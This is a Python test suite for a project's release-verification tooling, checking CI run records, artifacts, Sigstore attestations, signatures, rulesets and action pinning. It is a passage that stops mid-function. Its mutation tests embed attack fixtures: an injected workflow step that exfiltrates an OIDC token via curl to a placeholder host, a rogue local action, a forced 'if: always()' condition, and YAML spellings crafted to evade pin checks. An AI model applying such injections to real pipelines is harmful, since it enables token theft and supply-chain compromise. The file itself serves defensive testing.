#!/usr/bin/env python3
"""Offline adversarial tests for the FR-0012 epoch-13 trust root."""

from __future__ import annotations

import base64
import copy
import gc
import hashlib
import importlib.util
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
import unittest
import warnings
from collections import Counter
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from types import ModuleType
from typing import Any, Iterator
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]
COMMIT = "a" * 40
TREE = "b" * 40
RUN_ID = 42_424_242
RUN_NUMBER = 707
ATTEMPT = 2


def load_module(relative: str, name: str) -> ModuleType:
    specification = importlib.util.spec_from_file_location(name, ROOT / relative)
    if specification is None or specification.loader is None:
        raise RuntimeError(relative)
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    return module


PROTOCOL = load_module(
    "tools/release/framework_recovery_fr_0012.py",
    "_haldir_fr0012_test_protocol",
)
RESULT = load_module(
    "tools/release/framework_recovery_fr_0012_result.py",
    "_haldir_fr0012_test_result",
)
BRIDGE = load_module(
    "tools/release/verify-framework-recovery-fr-0012.py",
    "_haldir_fr0012_test_bridge",
)
CAPTURE = load_module(
    "tools/release/framework_recovery_fr_0012_capture.py",
    "_haldir_fr0012_test_capture",
)
PINS = load_module("tools/verify-ci-pins.py", "_haldir_fr0012_test_pins")


def utc(hour: int, minute: int, second: int = 0) -> str:
    return f"2026-07-29T{hour:02d}:{minute:02d}:{second:02d}Z"


def job(name: str, database_id: int, start: int, end: int) -> dict:
    return {
        "completedAt": utc(12, end),
        "conclusion": "success",
        "databaseId": database_id,
        "name": name,
        "startedAt": utc(12, start),
        "status": "completed",
        "steps": [
            {
                "completedAt": utc(12, end),
                "conclusion": "success",
                "name": "complete",
                "number": 1,
                "startedAt": utc(12, start),
                "status": "completed",
            }
        ],
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/job/{database_id}"
        ),
    }


def run_documents(workflow: str = "ci") -> tuple[dict, dict]:
    if workflow == "ci":
        names = sorted(PROTOCOL.EPOCH13_CI_JOB_NAMES)
        producer = "supply-chain"
        attester = "attest-ci-audit-result"
    else:
        names = sorted(PROTOCOL.EPOCH13_FORMAL_JOB_NAMES)
        producer = "tlc-model-check"
        attester = "attest-formal-audit-result"
    jobs = []
    for index, name in enumerate(names, start=1):
        start, end = (1, 4) if name == producer else (1, 3)
        if name == attester:
            start, end = 6, 8
        jobs.append(job(name, 50_000 + index, start, end))
    common = {
        "attempt": ATTEMPT,
        "conclusion": "success",
        "createdAt": utc(10, 0),
        "databaseId": RUN_ID,
        "event": "push",
        "headBranch": "main",
        "headSha": COMMIT,
        "jobs": jobs,
        "number": RUN_NUMBER,
        "status": "completed",
        "updatedAt": utc(12, 10),
        "workflowDatabaseId": PROTOCOL.WORKFLOW_DATABASE_IDS[workflow],
        "workflowName": workflow,
    }
    ordinary = {
        **common,
        "url": f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}",
    }
    attempt = {
        **common,
        "createdAt": utc(12, 0),
        "startedAt": utc(12, 0),
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{ATTEMPT}"
        ),
    }
    return ordinary, attempt


def file_record(path: str, seed: str) -> dict:
    payload = seed.encode()
    framed = b"blob " + str(len(payload)).encode() + b"\0" + payload
    return {
        "path": path,
        "git_mode": "100644",
        "git_object_type": "blob",
        "git_object_id": hashlib.sha1(framed, usedforsecurity=False).hexdigest(),
        "sha256": hashlib.sha256(payload).hexdigest(),
        "bytes": len(payload),
    }


def result_payload(workflow: str = "ci", attempt: int = ATTEMPT) -> tuple[bytes, list]:
    contract = PROTOCOL.RESULT_CONTRACT[workflow]
    materials = [
        file_record(path, f"material-{index}")
        for index, path in enumerate(contract["material_paths"])
    ]
    value = {
        "schema_version": "1.0.0",
        "protocol": PROTOCOL.RESULT_PROTOCOL,
        "repository": {
            "name": PROTOCOL.REPOSITORY,
            "database_id": PROTOCOL.REPOSITORY_ID,
            "owner_database_id": PROTOCOL.REPOSITORY_OWNER_ID,
        },
        "subject": {
            "commit": COMMIT,
            "tree": TREE,
            "ref": "refs/heads/main",
            "event": "push",
        },
        "execution": {
            "workflow": workflow,
            "workflow_ref": (
                f"sepahead/haldir/{contract['workflow_path']}@refs/heads/main"
            ),
            "job": contract["job"],
            "run_id": RUN_ID,
            "run_attempt": attempt,
            "run_number": RUN_NUMBER,
            "command": contract["command"],
            "result": "PASS",
        },
        "materials": materials,
        "authority": {
            "provenance_only": True,
            "release_authority": False,
            "deployment_authority": False,
            "publication_authority": False,
            "tag_authority": False,
        },
    }
    return PROTOCOL.canonical_json_bytes(value, pretty=True), materials


def artifact(payload: bytes, workflow: str = "ci", attempt: int = ATTEMPT) -> dict:
    artifact_id = 9_001
    return {
        "archive_download_url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}/zip"
        ),
        "created_at": utc(12, 2),
        "digest": "sha256:" + hashlib.sha256(payload).hexdigest(),
        "expired": False,
        "expires_at": "2026-10-27T12:02:00Z",
        "id": artifact_id,
        "name": f"epoch-13-{workflow}-result-attempt-{attempt}.json",
        "node_id": "MDg6QXJ0aWZhY3Q5MDAx",
        "size_in_bytes": len(payload),
        "updated_at": utc(12, 3),
        "url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}"
        ),
        "workflow_run": {
            "head_branch": "main",
            "head_repository_id": PROTOCOL.REPOSITORY_ID,
            "head_sha": COMMIT,
            "id": RUN_ID,
            "repository_id": PROTOCOL.REPOSITORY_ID,
        },
    }


def attestation_fixture(
    payload: bytes,
    workflow: str = "ci",
    attempt: int = ATTEMPT,
) -> tuple[bytes, list]:
    statement = PROTOCOL._expected_attestation_statement(
        workflow=workflow,
        result_digest=hashlib.sha256(payload).hexdigest(),
        subject_commit=COMMIT,
        expected_ref="refs/heads/main",
        run_id=RUN_ID,
        attempt=attempt,
    )
    bundle = {
        "mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json",
        "verificationMaterial": {"tlogEntries": [{"logIndex": "1"}]},
        "dsseEnvelope": {
            "payload": base64.b64encode(
                json.dumps(statement, separators=(",", ":")).encode()
            ).decode(),
            "payloadType": "application/vnd.in-toto+json",
            "signatures": [{"sig": "AA=="}],
        },
    }
    bundle_payload = (
        json.dumps(bundle, separators=(",", ":"), sort_keys=True) + "\n"
    ).encode()
    workflow_path = PROTOCOL.RESULT_CONTRACT[workflow]["workflow_path"]
    identity = f"https://github.com/sepahead/haldir/{workflow_path}@refs/heads/main"
    certificate = {
        "subjectAlternativeName": identity,
        "issuer": "https://token.actions.githubusercontent.com",
        "githubWorkflowTrigger": "push",
        "githubWorkflowSHA": COMMIT,
        "githubWorkflowName": workflow,
        "githubWorkflowRepository": "sepahead/haldir",
        "githubWorkflowRef": "refs/heads/main",
        "buildSignerURI": identity,
        "buildSignerDigest": COMMIT,
        "runnerEnvironment": "github-hosted",
        "sourceRepositoryURI": "https://github.com/sepahead/haldir",
        "sourceRepositoryDigest": COMMIT,
        "sourceRepositoryRef": "refs/heads/main",
        "sourceRepositoryIdentifier": str(PROTOCOL.REPOSITORY_ID),
        "sourceRepositoryOwnerURI": "https://github.com/sepahead",
        "sourceRepositoryOwnerIdentifier": str(PROTOCOL.REPOSITORY_OWNER_ID),
        "buildConfigURI": identity,
        "buildConfigDigest": COMMIT,
        "buildTrigger": "push",
        "runInvocationURI": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{attempt}"
        ),
        "sourceRepositoryVisibilityAtSigning": "public",
    }
    receipt = [
        {
            "attestation": {
                "bundle": bundle,
                "bundle_url": "",
                "initiator": "",
            },
            "verificationResult": {
                "mediaType": (
                    "application/vnd.dev.sigstore.verificationresult+json;version=0.1"
                ),
                "statement": statement,
                "signature": {"certificate": certificate},
                "verifiedTimestamps": [
                    {
                        "type": "Tlog",
                        "uri": "https://rekor.sigstore.dev",
                        "timestamp": utc(12, 7),
                    }
                ],
            },
        }
    ]
    return bundle_payload, receipt


@contextmanager
def changed_directory(path: Path) -> Iterator[None]:
    previous = Path.cwd()
    os.chdir(path)
    try:
        yield
    finally:
        os.chdir(previous)


class RunDocumentTests(unittest.TestCase):
    def test_attempt_two_is_valid_and_fully_bound(self) -> None:
        ordinary, attempt = run_documents()
        result = PROTOCOL.validate_epoch13_run_documents(
            ordinary,
            attempt,
            workflow="ci",
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
        )
        self.assertEqual(result["attempt"], 2)
        self.assertEqual(result["run_id"], RUN_ID)
        self.assertEqual(set(result["jobs"]), PROTOCOL.EPOCH13_CI_JOB_NAMES)

    def test_cross_run_job_url_is_rejected(self) -> None:
        ordinary, attempt = run_documents()
        attempt["jobs"][0]["url"] = (
            "https://github.com/sepahead/haldir/actions/runs/999/job/50001"
        )
        ordinary["jobs"] = copy.deepcopy(attempt["jobs"])
        with self.assertRaisesRegex(ValueError, "FR0012_JOB"):
            PROTOCOL.validate_epoch13_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_cross_attempt_documents_are_rejected(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        with self.assertRaisesRegex(ValueError, "EPOCH13_RUN_METADATA"):
            PROTOCOL.validate_epoch13_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_attempt_bound_is_fail_closed(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = attempt["attempt"] = 9
        with self.assertRaisesRegex(ValueError, "epoch13.attempt_number"):
            PROTOCOL.validate_epoch13_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )


class ResultAndArtifactTests(unittest.TestCase):
    def test_attempt_two_result_and_artifact(self) -> None:
        payload, materials = result_payload()
        PROTOCOL.validate_result_artifact(
            payload,
            workflow="ci",
            subject_commit=COMMIT,
            subject_tree=TREE,
            run_id=RUN_ID,
            attempt=ATTEMPT,
            run_number=RUN_NUMBER,
            expected_ref="refs/heads/main",
            expected_materials=materials,
        )
        PROTOCOL.validate_artifact_metadata(
            artifact(payload),
            workflow="ci",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            subject_commit=COMMIT,
            result_payload=payload,
            producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
            producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
            attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
        )

    def test_cross_attempt_result_is_rejected(self) -> None:
        payload, materials = result_payload(attempt=1)
        with self.assertRaisesRegex(ValueError, "RESULT_EXECUTION"):
            PROTOCOL.validate_result_artifact(
                payload,
                workflow="ci",
                subject_commit=COMMIT,
                subject_tree=TREE,
                run_id=RUN_ID,
                attempt=2,
                run_number=RUN_NUMBER,
                expected_ref="refs/heads/main",
                expected_materials=materials,
            )

    def test_cross_attempt_artifact_name_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_IDENTITY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=2,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
                producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
                attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            )

    def test_artifact_outside_producer_window_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload)
        value["updated_at"] = utc(12, 7)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=ATTEMPT,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
                producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
                attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            )


class AttestationTests(unittest.TestCase):
    def validate(self, bundle: bytes, receipt: list) -> dict:
        payload, _materials = result_payload()
        return PROTOCOL.validate_attestation_evidence(
            bundle,
            receipt,
            workflow="ci",
            result_payload=payload,
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            attestation_completed=datetime(2026, 7, 29, 12, 8, tzinfo=timezone.utc),
        )

    def test_public_good_tlog_receipt_is_valid(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        result = self.validate(bundle, receipt)
        self.assertEqual(result["transparency_log"]["type"], "Tlog")

    def test_transparency_log_type_mutation_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["type"] = (
            "TransparencyLog"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_unpinned_log_uri_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["uri"] = (
            "attacker.invalid"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_scheme_less_log_uri_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["uri"] = (
            "rekor.sigstore.dev"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_capability_url_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["attestation"]["bundle_url"] = "https://example.invalid/token"
        with self.assertRaisesRegex(ValueError, "RECEIPT_BUNDLE"):
            self.validate(bundle, receipt)

    def test_cross_attempt_statement_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "STATEMENT_MISMATCH"):
            self.validate(bundle, receipt)

    def test_witness_outside_attestation_job_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["timestamp"] = utc(
            12, 9
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG_TIME"):
            self.validate(bundle, receipt)


class TrustedRootAndCommandTests(unittest.TestCase):
    def test_real_openssh_detached_signature_is_accepted(self) -> None:
        payload = b"FR-0012 detached signature parser integration\n"
        namespace = "haldir-fr0012-openssh-integration"
        principal = "fixture@example.invalid"
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            private_key = repo / "signing-key"
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-q",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-C",
                    principal,
                    "-f",
                    str(private_key),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            public_key = private_key.with_suffix(".pub")
            fingerprint = (
                subprocess.check_output(["/usr/bin/ssh-keygen", "-lf", str(public_key)])
                .decode("ascii")
                .split()[1]
            )
            allowed_signers = repo / BRIDGE.ALLOWED_SIGNERS_PATH
            allowed_signers.parent.mkdir(parents=True)
            allowed_signers.write_text(
                f'{principal} namespaces="{namespace}" '
                f"{public_key.read_text(encoding='ascii')}",
                encoding="ascii",
            )
            payload_path = repo / "payload"
            payload_path.write_bytes(payload)
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-Y",
                    "sign",
                    "-f",
                    str(private_key),
                    "-n",
                    namespace,
                    str(payload_path),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            signature = Path(f"{payload_path}.sig").read_text(encoding="ascii")
            record = {
                "format": "ssh",
                "namespace": namespace,
                "principal": principal,
                "key_fingerprint": fingerprint,
                "signature": signature,
            }
            original_principal = BRIDGE.SIGNER_PRINCIPAL
            original_fingerprint = BRIDGE.SIGNER_FINGERPRINT
            try:
                BRIDGE.SIGNER_PRINCIPAL = principal
                BRIDGE.SIGNER_FINGERPRINT = fingerprint
                BRIDGE._verify_detached(repo, record, payload, namespace=namespace)
            finally:
                BRIDGE.SIGNER_PRINCIPAL = original_principal
                BRIDGE.SIGNER_FINGERPRINT = original_fingerprint

    def test_source_authority_file_is_frozen(self) -> None:
        self.assertIn(BRIDGE.ALLOWED_SIGNERS_PATH, BRIDGE.LEGACY_RECORDS)
        self.assertIn(
            BRIDGE.ALLOWED_SIGNERS_PATH,
            BRIDGE.PROTECTED_AFTER_ACTIVATION,
        )

    def test_commit_verification_ignores_configured_ssh_program(self) -> None:
        command = BRIDGE._verify_commit_argv(Path("/repo"), COMMIT)
        self.assertIn("gpg.ssh.program=/usr/bin/ssh-keygen", command)
        self.assertIn(
            "gpg.ssh.allowedSignersFile=/repo/release/0.9.0/allowed-signers",
            command,
        )

    def test_exact_public_good_root(self) -> None:
        payload = (ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes()
        BRIDGE._validate_trusted_root(payload)
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(), BRIDGE.TRUSTED_ROOT_SHA256
        )

    def test_root_byte_substitution_is_rejected(self) -> None:
        payload = bytearray((ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes())
        payload[100] ^= 1
        with self.assertRaisesRegex(RuntimeError, "TRUSTED_ROOT_BOUND"):
            BRIDGE._validate_trusted_root(bytes(payload))

    def test_offline_verification_argv_is_exact(self) -> None:
        command = BRIDGE._verification_argv(
            executable=Path("/usr/bin/gh"),
            result_path=Path("/tmp/result"),
            bundle_path=Path("/tmp/bundle"),
            trusted_root_path=Path("/tmp/root"),
            workflow="ci",
            subject_commit=COMMIT,
        )
        for flag in (
            "--bundle",
            "--custom-trusted-root",
            "--cert-identity",
            "--cert-oidc-issuer",
            "--deny-self-hosted-runners",
            "--predicate-type",
            "--signer-digest",
            "--source-digest",
            "--source-ref",
        ):
            self.assertEqual(command.count(flag), 1)
        self.assertNotIn("--no-public-good", command)
        self.assertNotIn("--signer-workflow", command)
        self.assertIn(COMMIT, command)

    def test_offline_verification_environment_is_deterministic(self) -> None:
        environment = BRIDGE._offline_verification_environment(
            executable=Path("/opt/gh/bin/gh"),
            root=Path("/tmp/root"),
            config_dir=Path("/tmp/root/config"),
        )
        self.assertEqual(environment["TZ"], "UTC")
        self.assertEqual(environment["LC_ALL"], "C")
        self.assertEqual(environment["PATH"], "/opt/gh/bin:/usr/bin:/bin")
        self.assertEqual(environment["NO_PROXY"], "")
        self.assertEqual(
            {
                environment["ALL_PROXY"],
                environment["HTTPS_PROXY"],
                environment["HTTP_PROXY"],
            },
            {"http://127.0.0.1:1"},
        )
        self.assertNotIn("LANG", environment)

    def test_hosted_commands_use_exact_artifact_id(self) -> None:
        commands = BRIDGE._hosted_commands(
            workflow="ci",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            artifact_id=9001,
        )
        self.assertIn("/artifacts/9001/zip", commands["artifact_download"])
        self.assertIn("/artifacts/9001", commands["artifact_get"])
        self.assertNotIn("gh run download", commands["artifact_download"])
        self.assertIn("attempt-2.json", commands["artifact_list"])


class WorktreeIntegrityTests(unittest.TestCase):
    def test_executable_drift_and_unsafe_write_bits_are_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            subprocess.run(
                ["/usr/bin/git", "init", "-q", repo],
                check=True,
            )
            protected = repo / "protected.txt"
            protected.write_text("frozen\n")
            environment = {
                **os.environ,
                "GIT_AUTHOR_NAME": "Test",
                "GIT_AUTHOR_EMAIL": "test@example.invalid",
                "GIT_COMMITTER_NAME": "Test",
                "GIT_COMMITTER_EMAIL": "test@example.invalid",
                "GIT_CONFIG_GLOBAL": os.devnull,
                "GIT_CONFIG_NOSYSTEM": "1",
            }
            subprocess.run(
                ["/usr/bin/git", "-C", repo, "add", "protected.txt"],
                check=True,
                env=environment,
            )
            subprocess.run(
                [
                    "/usr/bin/git",
                    "-C",
                    repo,
                    "-c",
                    "commit.gpgsign=false",
                    "commit",
                    "-q",
                    "-m",
                    "fixture",
                ],
                check=True,
                env=environment,
            )
            commit = (
                subprocess.check_output(
                    ["/usr/bin/git", "-C", repo, "rev-parse", "HEAD"],
                    env=environment,
                )
                .decode()
                .strip()
            )
            os.chmod(protected, 0o644)
            BRIDGE._verify_worktree(repo, commit, ["protected.txt"])
            for mode in (0o755, 0o666):
                with self.subTest(mode=oct(mode)):
                    os.chmod(protected, mode)
                    with self.assertRaisesRegex(RuntimeError, "FR0012_WORKTREE"):
                        BRIDGE._verify_worktree(repo, commit, ["protected.txt"])


class RulesetTests(unittest.TestCase):
    def fixture(self) -> tuple[list, dict, list]:
        ruleset_id = 8181
        summary = {
            "id": ruleset_id,
            "name": BRIDGE.MAIN_RULESET_NAME,
            "target": "branch",
            "enforcement": "active",
            "source_type": "Repository",
            "source": "sepahead/haldir",
        }
        detail = {
            **summary,
            "bypass_actors": [
                {
                    "actor_id": BRIDGE.MAIN_RULESET_OWNER_ID,
                    "actor_type": "User",
                    "bypass_mode": "always",
                }
            ],
            "conditions": {
                "ref_name": {
                    "exclude": [],
                    "include": ["refs/heads/main"],
                }
            },
            "rules": [
                {
                    "type": "update",
                    "parameters": {"update_allows_fetch_and_merge": False},
                }
            ],
        }
        effective = [
            {
                "type": "update",
                "parameters": {"update_allows_fetch_and_merge": False},
                "ruleset_id": ruleset_id,
                "ruleset_source_type": "Repository",
                "ruleset_source": "sepahead/haldir",
            }
        ]
        return [summary], detail, effective

    def test_owner_only_main_ruleset(self) -> None:
        result = BRIDGE.validate_main_writer_ruleset(*self.fixture())
        self.assertEqual(result["owner_user_id"], 10_104_569)
        self.assertIn("GITHUB_APPS", result["protects_against"])

    def test_additional_bypass_actor_is_rejected(self) -> None:
        summary, detail, effective = self.fixture()
        detail["bypass_actors"].append(
            {"actor_id": 99, "actor_type": "User", "bypass_mode": "always"}
        )
        with self.assertRaisesRegex(RuntimeError, "RULESET_BYPASS"):
            BRIDGE.validate_main_writer_ruleset(summary, detail, effective)

    def test_fetch_and_merge_update_is_rejected(self) -> None:
        summary, detail, effective = self.fixture()
        detail["rules"][0]["parameters"]["update_allows_fetch_and_merge"] = True
        with self.assertRaisesRegex(RuntimeError, "RULESET_RULES"):
            BRIDGE.validate_main_writer_ruleset(summary, detail, effective)

    def test_non_main_condition_is_rejected(self) -> None:
        summary, detail, effective = self.fixture()
        detail["conditions"]["ref_name"]["include"] = ["~ALL"]
        with self.assertRaisesRegex(RuntimeError, "RULESET_CONDITIONS"):
            BRIDGE.validate_main_writer_ruleset(summary, detail, effective)


class WorkflowAndPinTests(unittest.TestCase):
    def test_all_uses_syntax_is_accounted(self) -> None:
        uses, problems = PINS.collect_uses(
            "steps:\n  - uses: owner/action@" + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertEqual(len(uses), 1)
        self.assertEqual(problems, [])

    def test_quoted_uses_key_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            '"uses": owner/action@' + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertTrue(problems)

    def test_yaml_equivalent_uses_spellings_are_rejected(self) -> None:
        mutable = "actions/checkout@main"
        evasions = {
            "escaped-key": f'"u\\u0073es": {mutable}\n',
            "explicit-tagged-key": f"? !!str uses\n: {mutable}\n",
            "flow-mapping": f"job: {{ uses: {mutable} }}\n",
            "flow-pair": f'steps: ["uses": {mutable}]\n',
            "tagged-key": f"!!str uses: {mutable}\n",
            "block-scalar-dedent": (
                "steps:\n"
                "  - run: |\n"
                "        echo deliberately over-indented\n"
                f'    "u\\u0073es": {mutable}\n'
            ),
            "empty-block-scalar-sibling": (
                f'steps:\n  - run: |\n    "u\\u0073es": {mutable}\n'
            ),
        }
        for label, text in evasions.items():
            with self.subTest(label=label):
                _uses, problems = PINS.collect_uses(text, label="fixture")
                self.assertTrue(problems)

    def test_current_workflows_use_the_restricted_yaml_subset(self) -> None:
        for path in sorted((ROOT / ".github/workflows").glob("*.y*ml")):
            with self.subTest(path=path.name):
                self.assertEqual(
                    PINS.validate_workflow_syntax(
                        path.read_text(),
                        label=path.name,
                    ),
                    [],
                )

    def test_mutable_container_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            "uses: docker://alpine:latest\n", label="fixture"
        )
        self.assertTrue(problems)

    def test_oidc_jobs_have_no_repository_execution(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        formal = (ROOT / ".github/workflows/formal.yml").read_text()
        self.assertEqual(
            PINS.verify_oidc_job(
                ci,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            ),
            [],
        )
        self.assertEqual(
            PINS.verify_oidc_job(
                formal,
                label="formal",
                job="attest-formal-audit-result",
                expected_needs=("tlc-model-check",),
            ),
            [],
        )

    def test_oidc_local_action_mutation_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        mutated = ci.replace(
            "      - name: Download immutable audit result",
            "      - uses: ./attacker\n      - name: Download immutable audit result",
        )
        problems = PINS.verify_oidc_job(
            mutated,
            label="ci",
            job="attest-ci-audit-result",
            expected_needs=(
                "build-test",
                "clean-build",
                "feature-matrix",
                "interop",
                "macos-compile",
                "supply-chain",
            ),
        )
        self.assertTrue(problems)

    def test_oidc_commented_condition_and_always_are_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        condition = (
            "    if: >-\n"
            "      github.repository == 'sepahead/haldir' &&\n"
            "      github.event_name == 'push' &&\n"
            "      github.ref == 'refs/heads/main'\n"
        )
        replacement = (
            "    # if: >-\n"
            "    #   github.repository == 'sepahead/haldir' &&\n"
            "    #   github.event_name == 'push' &&\n"
            "    #   github.ref == 'refs/heads/main'\n"
            "    if: always()\n"
        )
        mutated = ci.replace(condition, replacement, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_oidc_injected_shell_step_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        marker = "      - name: Download immutable audit result\n"
        injected = (
            "      - name: Exfiltrate OIDC token\n"
            "        run: curl https://example.invalid\n" + marker
        )
        mutated = ci.replace(marker, injected, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_attempt_qualified_unarchived_outputs(self) -> None:
        for workflow in ("ci", "formal"):
            text = (ROOT / f".github/workflows/{workflow}.yml").read_text()
            self.assertIn("archive: false", text)
            self.assertIn(
                f"epoch-13-{workflow}-result-attempt-${{{{ github.run_attempt }}}}.json",
                text,
            )
            self.assertNotIn(f"name: epoch-13-{workflow}-result-attempt", text)

    def test_github_cli_archive_is_immutable(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        self.assertEqual(BRIDGE.GH_CLI_VERSION, "2.95.0")
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_BYTES), ci)
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_BYTES), ci)
        self.assertIn(
            "releases/download/v${GH_CLI_VERSION}/"
            "gh_${GH_CLI_VERSION}_linux_amd64.tar.gz",
            ci,
        )
        self.assertIn("--proto '=https'", ci)
        self.assertIn("--proto-redir '=https'", ci)
        self.assertIn("--tlsv1.2", ci)
        self.assertIn(
            '-- "gh_${GH_CLI_VERSION}_linux_amd64/bin/gh"',
            ci,
        )
        self.assertIn("sha256sum --check --strict", ci)
        self.assertNotIn("curl |", ci)

    def test_hosted_runner_labels_are_versioned(self) -> None:
        for workflow, expected in PINS.EXPECTED_RUNNERS.items():
            text = (ROOT / ".github/workflows" / workflow).read_text()
            self.assertEqual(
                Counter(PINS.RUNS_ON_LINE.findall(text)),
                expected,
            )
            self.assertFalse(
                any(
                    label.endswith("-latest")
                    for label in PINS.RUNS_ON_LINE.findall(text)
                )
            )

    def test_gate_does_not_execute_legacy_verifier(self) -> None:
        text = (ROOT / BRIDGE.GATE_PATH).read_text()
        self.assertNotIn("verify-current-audit.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0011.py", text)
        self.assertIn("verify-framework-recovery-fr-0012.py", text)

    def test_new_root_never_imports_fr0011_python(self) -> None:
        for relative in (
            BRIDGE.MODULE_PATH,
            BRIDGE.CAPTURE_PATH,
            BRIDGE.RESULT_PATH,
            BRIDGE.BRIDGE_PATH,
        ):
